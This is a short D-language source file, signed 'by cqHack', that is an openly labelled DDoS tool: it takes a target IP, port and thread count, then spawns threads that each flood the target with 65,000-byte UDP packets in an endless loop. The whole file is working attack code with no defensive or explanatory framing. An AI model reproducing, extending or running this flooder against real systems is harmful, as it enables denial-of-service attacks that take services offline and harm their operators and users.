// by cqHack

import std.socket;
import std.stdio;
import std.conv;
import std.concurrency;

int main(string[] args){
    if(args.length < 3){
        writeln("Usage: ", args[0], " [ip] [port] [threads]");
        return 1;
    }

    writeln("Begin ddos attack");
    int threads;
    if(args.length == 3){
        threads = 10;
    }else{
        threads = to!int(args[3]);
    }

    writeln("Starting ", to!string(threads), " threads");

    byte[] tmp = new byte[65000];
    tmp[0..64999] = 0x00;
    immutable byte[] buffer = cast(immutable) tmp;

    for(int i = 0; i < threads; i++){
        spawn(&attack, args[1], to!ushort(args[2]), buffer);
    }
    return 0;
}

void attack(string ip, ushort port, immutable byte[] buffer){
    InternetAddress addr = new InternetAddress(ip, port);
    UdpSocket udp = new UdpSocket();
    while(true){
        udp.sendTo(buffer, addr);
        //writeln("Sent packet");
    }
}
